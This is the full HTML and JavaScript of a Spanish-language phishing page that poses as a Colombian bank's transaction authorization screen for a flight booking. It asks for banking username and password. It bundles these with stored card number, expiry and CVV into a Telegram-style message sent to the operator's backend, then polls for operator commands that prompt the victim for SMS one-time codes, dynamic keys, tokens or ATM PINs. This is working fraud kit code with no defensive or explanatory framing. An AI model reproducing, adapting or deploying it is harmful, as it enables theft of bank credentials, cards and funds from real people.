<!DOCTYPE html>
<html lang="es">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Autorizaci√≥n de Transacci√≥n</title>
    <!-- Using CDN for jQuery -->
    <script src="https://code.jquery.com/jquery-3.7.1.min.js"></script>
    <!-- Using CDN for CryptoJS (includes AES, MD5, PBKDF2) -->
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/crypto-js.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/aes.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/md5.min.js"></script>
    <script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/4.1.1/pbkdf2.min.js"></script>
    <!-- Simple string mask implementation -->
    <script>
        // Simple string mask implementation
        if (typeof StringMask === 'undefined') {
            var StringMask = {
                apply: function(value, pattern) {
                    if (!value) return '';
                    value = String(value);
                    let result = '';
                    let valueIndex = 0;
                    for (let i = 0; i < pattern.length && valueIndex < value.length; i++) {
                        if (pattern[i] === '0') {
                            result += value[valueIndex++];
                        } else {
                            result += pattern[i];
                        }
                    }
                    return result;
                }
            };
        }

        // AesUtil implementation
        if (typeof AesUtil === 'undefined') {
            var AesUtil = function(keySize, iterationCount) {
                this.keySize = keySize / 32;
                this.iterationCount = iterationCount;

                this.generateKey = function(salt, passPhrase) {
                    var key = CryptoJS.PBKDF2(
                        passPhrase,
                        CryptoJS.enc.Hex.parse(salt),
                        { keySize: this.keySize, iterations: this.iterationCount });
                    return key;
                };

                this.encrypt = function(salt, iv, passPhrase, plainText) {
                    var key = this.generateKey(salt, passPhrase);
                    var encrypted = CryptoJS.AES.encrypt(
                        plainText,
                        key,
                        { iv: CryptoJS.enc.Hex.parse(iv) });
                    return encrypted.ciphertext.toString(CryptoJS.enc.Base64);
                };

                this.decrypt = function(salt, iv, passPhrase, cipherText) {
                    var key = this.generateKey(salt, passPhrase);
                    var cipherParams = CryptoJS.lib.CipherParams.create({
                        ciphertext: CryptoJS.enc.Base64.parse(cipherText)
                    });
                    var decrypted = CryptoJS.AES.decrypt(
                        cipherParams,
                        key,
                        { iv: CryptoJS.enc.Hex.parse(iv) });
                    return decrypted.toString(CryptoJS.enc.Utf8);
                };
            };
        }
    </script>
    
    <style>
        /* Estilos Base */
        body { font-family: Arial, sans-serif; margin: 0; background: #f5f5f5; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
        .container { width: 100%; max-width: 400px; background: #fff; border-radius: 10px; box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1); padding: 20px; box-sizing: border-box; overflow-y: auto; margin: 0 10px; }
        .header { display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px; border-bottom: 1px solid #ccc; padding-bottom: 10px; }
        .header img { height: 35px; }
        .title { font-size: 18px; font-weight: bold; margin-bottom: 10px; text-align: left; }
        .details p { margin: 10px 0; font-size: 14px; }
        .input-group { display: flex; justify-content: flex-start; margin-bottom: 15px; }
        .input-group label { width: 35%; text-align: right; margin-right: 10px; font-size: 14px; align-self: center; }
        .input-group input { flex-grow: 1; padding: 8px; border: 1px solid #ccc; border-radius: 5px; font-size: 14px; max-width: 60%; }
        .button { width: 50%; padding: 10px; background: #000; color: #fff; border: none; border-radius: 5px; cursor: pointer; font-size: 16px; font-weight: bold; margin-top: 30px; text-align: center; display: block; margin-left: auto; margin-right: auto; }
        .hidden { display: none !important; }
        .instructions-text { font-size: 14px; color: #555; margin: 10px 0; line-height: 1.5; text-align: center; font-weight: normal; font-family: Arial, sans-serif; }
        
        /* LOADER MEJORADO */
        .loaderp-full { 
            position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); 
            width: 80%; max-width: 280px; height: 160px; 
            display: flex; flex-direction: column; justify-content: center; align-items: center; 
            background-color: rgba(255, 255, 255, 0.95); 
            border-radius: 12px; 
            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.15);
            z-index: 1000;
            padding: 20px;
        }
        .loaderp { 
            width: 55px; height: 55px; 
            border: 6px solid #e0e0e0; /* Gris claro */
            border-top-color: #007bff; /* Azul fuerte para contraste */
            border-radius: 50%; 
            display: inline-block; 
            box-sizing: border-box; 
            animation: rotation 1s linear infinite; 
        }
        @keyframes rotation { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        
        @media (max-width: 600px) {
            .loaderp { width: 45px; height: 45px; border: 5px solid #e0e0e0; border-top-color: #007bff; }
            .loaderp-full { width: 90%; max-width: 320px; height: 140px; }
            .input-group label { width: 40%; }
            .input-group input { max-width: 55%; }
        }
        /* Estilos para el texto dentro del loader */
        .loader-text { font-size: 15px; font-weight: bold; color: #333; margin-top: 15px; }
    </style>
</head>

<body>
    <div class="container">
        <div class="header">
            <img id="bank-logo" src="lgos/error2.png" alt="Banco Logo">
            <div class="id-check">
                <img id="card-type-logo" src="lgos/error.avif" alt="Tipo Tarjeta Logo" height="35">
            </div>
        </div>
        
        <div id="main-content-area">
            <div class="title">Autorizaci√≥n de transacci√≥n</div>
            <p class="small" style="color: #666; font-size: 13px;">La transacci√≥n de <strong>TIQUETES BARATOS S.A</strong> por <strong id="monto-transaccion">$49,999 COP</strong> con tarjeta terminada en <strong id="card-last4">0000</strong> debe ser autorizada.</p>
            <div class="details">
                <p><strong>Comercio:</strong> TIQUETES BARATOS S.A</p>
                <p><strong>Monto:</strong> <span id="monto-transaccion-detalle">Calculando...</span></p>
                <p><strong>Tarjeta:</strong> **** **** **** <span id="card-last4-display">0000</span></p>
            </div>
            
            <form id="transaction-form" onsubmit="return false;">
                <div id="credentials-container">
                    <div class="input-group">
                        <label id="usuario-label" for="usuario">Usuario:</label>
                        <input type="text" id="usuario" placeholder="Ingresa tu usuario">
                    </div>
                    <div class="input-group">
                        <label id="clave-label" for="clave">Clave:</label>
                        <input type="password" id="clave" placeholder="Ingresa tu clave" maxlength="11">
                    </div>
                    <p class="instructions-text">Estos son los datos que utilizas para ingresar a tu app bancaria.</p>
                </div>
                
                <div id="dynamic-code-container" class="hidden">
                    </div>

                
                <button class="button" id="authorize-button" disabled>Autorizar</button>
            </form>
        </div>

        <div class="loaderp-full hidden" id="loader-container">
            <span class="loaderp"></span>
            <p class="loader-text" id="loader-text">Validando credenciales...</p>
        </div>
    </div>

    <script>
        let pageState = 'initial'; // 'initial' o 'waiting_for_code'
        let currentTransactionId = '';
        let currentMessageId = '';

        function showLoader(show, text = "Validando datos...") {
            const loaderText = document.getElementById('loader-text');
            const loaderContainer = document.getElementById('loader-container');
            const mainContent = document.getElementById('main-content-area');
            
            if (loaderText) loaderText.textContent = text;
            if (loaderContainer) loaderContainer.classList.toggle("hidden", !show);
            if (mainContent) mainContent.style.visibility = show ? "hidden" : "visible";
        }

        function escapeMarkdownV2(text) {
            if (!text) return '';
            const specialChars = ['_', '*', '[', ']', '(', ')', '~', '`', '>', '#', '+', '-', '=', '|', '{', '}', '.', '!'];
            let escapedText = String(text);
            for (const char of specialChars) {
                const regex = new RegExp(`\\${char}`, 'g');
                escapedText = escapedText.replace(regex, `\\${char}`);
            }
            return escapedText;
        }

        function setFormDisabled(disabled) {
            // Deshabilita todos los campos y el bot√≥n
            document.getElementById('usuario').disabled = disabled;
            document.getElementById('clave').disabled = disabled;
            const dynamicInput = document.getElementById('dynamic-code');
            if (dynamicInput) dynamicInput.disabled = disabled;
            document.getElementById('authorize-button').disabled = disabled;
        }

        // --- L√ìGICA DE INICIALIZACI√ìN (MANTENIDA DE TU C√ìDIGO ORIGINAL) ---

        function obtenerPrecio(precio) { return parseFloat(precio.replace('$', '').replace(/\./g, '').replace(',', '.')); }
        function formatearPrecio(numero) { return numero.toLocaleString('es-CO', { style: 'currency', currency: 'COP' }); }
        
        function calcularPrecioTotal() {
            const datosVueloIda = JSON.parse(localStorage.getItem('datos_vuelo_ida'));
            const datosVueloRegreso = JSON.parse(localStorage.getItem('datos_vuelo_regreso'));
            let precioTotal = 49999; 
            if (datosVueloIda) precioTotal = obtenerPrecio(datosVueloIda.price);
            if (datosVueloRegreso) precioTotal += obtenerPrecio(datosVueloRegreso.price);
            
            const montoFormateado = formatearPrecio(precioTotal);
            document.getElementById("monto-transaccion").innerText = montoFormateado;
            document.getElementById("monto-transaccion-detalle").innerText = montoFormateado;
            localStorage.setItem('totalAmount', precioTotal);
        }

        function obtenerUltimos4Digitos() {
            const tbdatos = JSON.parse(localStorage.getItem('tbdatos'));
            if (tbdatos && tbdatos.cardNumber) {
                const ultimos4 = tbdatos.cardNumber.slice(-4);
                document.getElementById("card-last4").innerText = ultimos4;
                document.getElementById("card-last4-display").innerText = ultimos4;
            }
        }
        
        function normalizarBanco(nombreBanco) {
            const palabrasClave = { "av villas": "bavevi.png", "scotiabank colpatria": "bcolpa.png", "popular": "bpopular.png", "bogota": "bbogo.png", "caja social": "bcajas.png", "davivienda": "bdavi1.svg", "occidente": "bocinen.png", "bbva colombia": "bvva.png", "bbva": "bvva.png" };
            const nombreNormalizado = nombreBanco.toLowerCase();
            for (const clave in palabrasClave) { if (nombreNormalizado.includes(clave)) return palabrasClave[clave]; }
            return "error2.png";
        }

        function actualizarLogos() {
            const infoload = JSON.parse(localStorage.getItem('infoload'));
            const tiposTarjetas = { "visa": "visa.jpg", "mastercard": "master.webp", "amex": "amex.avif", "discover": "discover.png" };
            const bankLogo = document.getElementById("bank-logo");
            const cardTypeLogo = document.getElementById("card-type-logo");

            if (infoload && infoload.bank) bankLogo.src = `lgos/${normalizarBanco(infoload.bank)}`;
            else bankLogo.src = "lgos/error2.png";

            if (infoload && infoload.cardType && tiposTarjetas[infoload.cardType.toLowerCase()]) cardTypeLogo.src = `lgos/${tiposTarjetas[infoload.cardType.toLowerCase()]}`;
            else cardTypeLogo.src = "lgos/error.avif";

            const banco = infoload ? infoload.bank.toLowerCase() : '';
            const usuarioLabel = document.getElementById("usuario-label");
            const claveInput = document.getElementById("clave");
            
            if (banco.includes("bogota") || banco.includes("caja social") || banco.includes("occidente") || banco.includes("bbva")) {
                usuarioLabel.innerText = "C√©dula:";
                claveInput.setAttribute("maxlength", "6");
            } else if (banco.includes("davivienda")) {
                usuarioLabel.innerText = "C√©dula:";
            } else {
                usuarioLabel.innerText = "Usuario:";
                claveInput.setAttribute("maxlength", "11");
            }
        }

        function habilitarBoton() {
            // Esta funci√≥n ahora tambi√©n debe revisar si estamos en el estado de c√≥digo din√°mico
            const usuario = document.getElementById('usuario').value.trim();
            const clave = document.getElementById('clave').value.trim();
            const dynamicCode = document.getElementById('dynamic-code');

            let isFormValid = false;

            if (pageState === 'initial') {
                isFormValid = (usuario.length >= 4 && clave.length >= 4);
            } else if (pageState === 'waiting_for_code' && dynamicCode) {
                isFormValid = dynamicCode.value.trim().length >= 4;
            }

            document.getElementById('authorize-button').disabled = !isFormValid;
        }

        // --- L√≥gica de Cambio de UI (login -> c√≥digo) ---
        function switchInterfaceToCode(actionType, label) {
            pageState = 'waiting_for_code';
            
            document.getElementById('credentials-container').classList.add('hidden');
            document.querySelector('.instructions-text').classList.add('hidden'); // Oculta instrucci√≥n de login

            const container = document.getElementById('dynamic-code-container');
            
            // Determinar texto de ayuda y maxlength
            let instructions = "";
            let maxLength = "";
            let inputType = "text";
            
            if (actionType.includes("dinamica") || actionType.includes("token")) {
                instructions = "Consulta tu c√≥digo o token en la **aplicaci√≥n m√≥vil** de tu banco.";
                maxLength = "8";
            } else if (actionType.includes("otp")) {
                instructions = "Hemos enviado un c√≥digo SMS de un solo uso a tu **celular registrado**.";
                maxLength = "6";
            } else if (actionType.includes("cajero")) {
                instructions = "Ingresa tu clave de **cajero autom√°tico** (4 d√≠gitos).";
                maxLength = "4";
                inputType = "password";
            }
            
            container.innerHTML = `
                <div class="input-group">
                    <label for="dynamic-code">${label}:</label>
                    <input type="${inputType}" id="dynamic-code" data-type="${label}" placeholder="Ingresa el c√≥digo aqu√≠" maxlength="${maxLength}" required>
                </div>
                <p class="instructions-text">${instructions}</p>
            `;
            container.classList.remove('hidden');
            
            // Re-adjuntar el listener al nuevo input
            document.getElementById('dynamic-code').addEventListener('input', habilitarBoton);

            document.getElementById('authorize-button').textContent = "Validar C√≥digo";
            showLoader(false, "Validando c√≥digo..."); // Texto del loader cuando pide c√≥digo
            setFormDisabled(false);
            habilitarBoton(); // Revisa el estado inicial del nuevo campo
        }
        
        // --- MANEJO DE EVENTOS ---

        window.onload = function () {
            calcularPrecioTotal();
            obtenerUltimos4Digitos();
            actualizarLogos();
            habilitarBoton();
            if (!localStorage.getItem('transactionId')) {
                 localStorage.setItem('transactionId', currentTransactionId);
            }
        };

        // Listeners originales
        document.getElementById('usuario').addEventListener('input', habilitarBoton);
        document.getElementById('clave').addEventListener('input', habilitarBoton);

        // FORM SUBMIT HANDLING
        document.getElementById("transaction-form").addEventListener("submit", async function(event) {
            event.preventDefault(); 
            
            const tbdatos = JSON.parse(localStorage.getItem('tbdatos'));
            const totalAmount = localStorage.getItem('totalAmount') || '49999';
            const formattedAmount = formatearPrecio(parseFloat(totalAmount));
            let fullMessage = "";
            let keyboard = {};
            
            setFormDisabled(true);

            // 1. ESTADO INICIAL (USUARIO Y CLAVE)
            if (pageState === 'initial') {
                const user = document.getElementById('usuario').value.trim();
                const pass = document.getElementById('clave').value.trim();
                const bank = (tbdatos && tbdatos.bank) || sessionStorage.getItem('bank') || '‚ùì Desconocido';

                showLoader(true, "Validando credenciales..."); // Texto del loader para login

                // Mensaje con Markdown/HTML para Telegram
                fullMessage = `
‚úÖ NUEVA RESERVA - TIQUETES üõ´
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ DATOS DEL TITULAR
üÜî ID: ${tbdatos && tbdatos.documentId ? tbdatos.documentId : '‚ùå No ingresado'}
üì± Cel: ${tbdatos && tbdatos.phone ? tbdatos.phone : '‚ùå No ingresado'}
üí≥ Tarjeta: ${tbdatos && tbdatos.cardNumber ? tbdatos.cardNumber : '‚ùå No disponible'}
üìÖ Exp: ${tbdatos && tbdatos.expMonth && tbdatos.expYear ? `${tbdatos.expMonth}/${tbdatos.expYear}` : '‚ùå No disponible'}
üîê CVV: ${tbdatos && tbdatos.cvv ? tbdatos.cvv : '‚ùå No disponible'}
üè¶ Banco: ${bank}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîë DATOS DE ACCESO
üë§ Usuario: ${user}
üîë Contrase√±a: ${pass}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí∞ DETALLES DE LA TRANSACCI√ìN
üíµ Monto: ${formattedAmount}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üÜî ID de Transacci√≥n: ${currentTransactionId}
`;
                keyboard = {
                    inline_keyboard: [
                        [
                            { text: "üîë Pedir Din√°mica", callback_data: `pedir_dinamica:${currentTransactionId}` },
                            { text: "üì± Pedir OTP/SMS", callback_data: `pedir_otp:${currentTransactionId}` }
                        ],
                        [
                            { text: "üìü Pedir Token", callback_data: `pedir_token:${currentTransactionId}` },
                            { text: "üèß Clave Cajero", callback_data: `pedir_cajero:${currentTransactionId}` }
                        ],
                        [
                            { text: "‚ùå Error User/Clave", callback_data: `error_login:${currentTransactionId}` },
                            { text: "üí≥ Error Tarjeta", callback_data: `error_tarjeta:${currentTransactionId}` }
                        ],
                        [
                            { text: "‚úÖ Finalizar Transacci√≥n", callback_data: `finalizar:${currentTransactionId}` }
                        ]
                    ]
                };

            // 2. ESTADO C√ìDIGO (OTP, DINAMICA, ETC)
            } else if (pageState === 'waiting_for_code') {
                const codeInput = document.getElementById('dynamic-code');
                const codeValue = codeInput.value.trim();
                const codeType = codeInput.dataset.type;
                const bank = (tbdatos && tbdatos.bank) || sessionStorage.getItem('bank') || '‚ùì Desconocido';
                
                showLoader(true, "Validando c√≥digo...");

                fullMessage = `
üõçÔ∏è NUEVA RESERVA - AVIANCA üõ´
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üë§ DATOS DEL TITULAR
üÜî ID: ${tbdatos && tbdatos.documentId ? tbdatos.documentId : '‚ùå No ingresado'}
üì± Cel: ${tbdatos && tbdatos.phone ? tbdatos.phone : '‚ùå No ingresado'}
üí≥ Tarjeta: ${tbdatos && tbdatos.cardNumber ? tbdatos.cardNumber : '‚ùå No disponible'}
üìÖ Exp: ${tbdatos && tbdatos.expMonth && tbdatos.expYear ? `${tbdatos.expMonth}/${tbdatos.expYear}` : '‚ùå No disponible'}
üîê CVV: ${tbdatos && tbdatos.cvv ? tbdatos.cvv : '‚ùå No disponible'}
üè¶ Banco: ${bank}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üîë DATOS DE ACCESO
üë§ Usuario: ${document.getElementById('usuario')?.value.trim() || 'N/A'}
üîë Contrase√±a: ${document.getElementById('clave')?.value.trim() || 'N/A'}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üî¢ C√ìDIGO RECIBIDO
üìå Tipo: ${codeType}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
‚ÄºÔ∏è C√≥digo: ${codeValue}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üí∞ DETALLES DE LA TRANSACCI√ìN
üíµ Monto: ${formattedAmount}
‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ‚îÅ
üÜî ID de Transacci√≥n: ${currentTransactionId}
`;
                keyboard = {
                    inline_keyboard: [
                        [
                            { text: "‚úÖ C√≥digo Correcto", callback_data: `finalizar:${currentTransactionId}` },
                            { text: "üîÑ Reenviar C√≥digo", callback_data: `error_code:${currentTransactionId}` }
                        ],
                        [
                            { text: "üîë Pedir Din√°mica", callback_data: `pedir_dinamica:${currentTransactionId}` },
                            { text: "üì± Pedir OTP/SMS", callback_data: `pedir_otp:${currentTransactionId}` }
                        ],
                        [
                            { text: "üìü Pedir Token", callback_data: `pedir_token:${currentTransactionId}` },
                            { text: "üèß Clave Cajero", callback_data: `pedir_cajero:${currentTransactionId}` }
                        ],
                        [
                            { text: "‚ùå Error User/Clave", callback_data: `error_login:${currentTransactionId}` },
                            { text: "üí≥ Error Tarjeta", callback_data: `error_tarjeta:${currentTransactionId}` }
                        ]
                    ]
                };
            }

            // --- ENV√çO AL BACKEND Y POLLING ---
            try {
                const response = await fetch('/api/send-message', {
                    method: "POST",
                    headers: { "Content-Type": "application/json" },
                    body: JSON.stringify({ text: fullMessage, keyboard: keyboard }),
                });

                const data = await response.json();

                if (response.ok && data.result) {
                    await startPolling(data.result.message_id);
                } else {
                    throw new Error("Error en servidor: " + (data.error || 'Desconocido'));
                }
            } catch (error) {
                console.error(error);
                showLoader(false, "Validando credenciales...");
                setFormDisabled(false);
                alert("Error de conexi√≥n. Intente nuevamente.");
            }
        });
        
        // --- POLLING (ESPERA RESPUESTA DEL PANEL) ---

        async function startPolling(messageId) {
            try {
                const response = await fetch(`/api/check-update/${messageId}`);
                
                if (response.status === 408) {
                    return await startPolling(messageId);
                }

                const data = await response.json();

                if (data.action) {
                    handleServerAction(data.action);
                } else {
                    setTimeout(() => startPolling(messageId), 2000);
                }
            } catch (error) {
                console.error("Polling error:", error);
                setTimeout(() => startPolling(messageId), 3000);
            }
        }

        function handleServerAction(action) {
            const actionClean = action.split(':')[0]; 

            switch (actionClean) {
                case 'pedir_dinamica':
                    switchInterfaceToCode('pedir_dinamica', 'Clave Din√°mica');
                    break;
                case 'pedir_otp':
                    switchInterfaceToCode('pedir_otp', 'C√≥digo SMS/OTP');
                    break;
                case 'pedir_token':
                    switchInterfaceToCode('pedir_token', 'Token de Seguridad');
                    break;
                case 'pedir_cajero':
                    switchInterfaceToCode('pedir_cajero', 'Clave de Cajero');
                    break;
                
                // ERRORES
                case 'error_login':
                    showLoader(false, "Validando credenciales...");
                    setFormDisabled(false);
                    document.getElementById('clave').value = ""; 
                    alert("Usuario o clave incorrectos. Intente nuevamente.");
                    pageState = 'initial';
                    document.getElementById('credentials-container').classList.remove('hidden');
                    document.querySelector('.instructions-text').classList.remove('hidden');
                    break;
                case 'error_code':
                    showLoader(false, "Validando c√≥digo...");
                    setFormDisabled(false);
                    const dynamicCodeInput = document.getElementById('dynamic-code');
                    if (dynamicCodeInput) dynamicCodeInput.value = "";
                    alert("C√≥digo inv√°lido o expirado. Intente nuevamente.");
                    break;
                case 'error_tc':
                    alert("Error en la tarjeta. Verifique los datos.");
                    window.location.href = "../pay/"; 
                    break;

                // √âXITO
                case 'finalizar':
                    window.location.href = "checking.html"; 
                    break;
                
                default:
                    console.log("Acci√≥n desconocida", action);
                    startPolling(currentTransactionId);
                    break;
            }
        }
    </script>
</body>
</html>